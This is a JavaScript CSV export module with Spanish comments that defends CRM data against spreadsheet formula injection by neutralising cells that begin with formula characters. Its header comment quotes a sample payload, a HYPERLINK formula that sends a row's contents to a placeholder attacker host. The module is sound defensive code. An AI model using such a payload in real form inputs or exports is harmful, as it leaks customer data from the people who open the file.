/**
 * Serialización a CSV. Módulo puro para poder testearlo: lo consume la
 * exportación de la tabla de registros.
 *
 * Aquí se resuelve un problema que no es de formato sino de seguridad. Los
 * datos del CRM entran por sitios que **no controlamos** — el formulario web
 * público y los leads de Meta —, y el CSV que exporta un comercial lo abre
 * Excel o Google Sheets, que interpretan como **fórmula** toda celda que empiece
 * por `=`, `+`, `-` o `@`. Un lead llamado
 * `=HYPERLINK("http://malo/?"&A1,"ver factura")` se convierte, al abrirlo, en un
 * enlace que se lleva la fila entera. Es la vía clásica de exfiltración desde un
 * formulario de captación, y entrecomillar el valor **no** la evita: las
 * comillas son del formato CSV, y la hoja de cálculo las quita antes de mirar el
 * contenido.
 */

/**
 * Caracteres con los que una hoja de cálculo empieza a interpretar la celda.
 * El tabulador y el retorno de carro van incluidos porque Excel los ignora al
 * principio y sigue leyendo lo que venga detrás.
 */
const FORMULA_STARTERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Desactiva una celda que la hoja de cálculo leería como fórmula, anteponiendo
 * una comilla simple (la marca estándar de "esto es texto"). El valor sigue
 * viéndose igual al abrirlo.
 *
 * @param {string} text
 * @returns {string}
 */
export function neutralizeFormula(text) {
  const s = String(text ?? '');
  return FORMULA_STARTERS.includes(s[0]) ? `'${s}` : s;
}

/**
 * Prepara un valor para una celda: neutraliza la fórmula y aplica el
 * entrecomillado del formato (las comillas internas se duplican).
 *
 * @param {unknown} text
 * @returns {string}
 */
export function csvCell(text) {
  return `"${neutralizeFormula(text).replace(/"/g, '""')}"`;
}

/**
 * Arma un CSV completo.
 * @param {string[]} header
 * @param {Array<Array<unknown>>} rows
 * @returns {string}
 */
export function toCsv(header, rows) {
  const lines = [header.map(csvCell).join(',')];
  for (const row of rows) lines.push(row.map(csvCell).join(','));
  return lines.join('\n');
}
